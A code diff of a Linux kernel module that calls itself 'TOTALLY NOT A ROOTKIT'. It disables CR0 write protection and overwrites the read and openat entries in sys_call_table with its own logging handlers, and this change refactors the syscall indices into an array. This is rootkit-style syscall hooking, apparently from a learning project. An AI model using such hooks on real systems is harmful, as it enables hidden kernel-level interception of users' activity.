@@ -27,6 +27,7 @@ MODULE_DESCRIPTION("TOTALLY NOT A ROOTKIT");
 static unsigned long *sys_call_table;
 static void* real_read;
 static void* real_openat;
+static int sys_call_indices[] = {__NR_read, __NR_openat};
 
 asmlinkage long totallyReal_read(int fd, char __user *buf, size_t count) {
 	pr_info("Intercepted read of fd=%d, %lu byes\n", fd, count);
@@ -55,20 +56,20 @@ int __init loadMod(void){
 	pr_info("sys_call_table pointer is %p\n", sys_call_table);
 
 	//saves original read syscall, injects fake read syscall
-	real_read = (void*) sys_call_table[__NR_read];
+	real_read = (void*) sys_call_table[sys_call_indices[0]];
 	pr_info("original read stored as %p\n", real_read);
 	CR0_WRITE_UNLOCK({
-		sys_call_table[__NR_read] = (void *) &totallyReal_read;
+		sys_call_table[sys_call_indices[0]] = (void *) &totallyReal_read;
 	});
-	pr_info("sys_call_table injected with phony_read ptr:%p\n", (void *)sys_call_table[__NR_read]);
+	pr_info("sys_call_table injected with phony_read ptr:%p\n", (void *)sys_call_table[sys_call_indices[0]]);
 
 	//saves original open syscall, injects fake open syscall
 	real_openat = (void *)sys_call_table[__NR_openat];
 	pr_info("original openat stored as %p\n", real_openat);
 	CR0_WRITE_UNLOCK({
-		sys_call_table[__NR_openat] = (void *) &totallyReal_openat;
+		sys_call_table[sys_call_indices[1]] = (void *) &totallyReal_openat;
 	});
-	pr_info("sys_call_table injected with totallyReal_openat ptr:%p\n", (void *)sys_call_table[__NR_openat]);
+	pr_info("sys_call_table injected with totallyReal_openat ptr:%p\n", (void *)sys_call_table[sys_call_indices[1]]);
 
 	/*
 	pr_info("old __NR_mkdir:%p", sys_call_table[__NR_mkdir]);
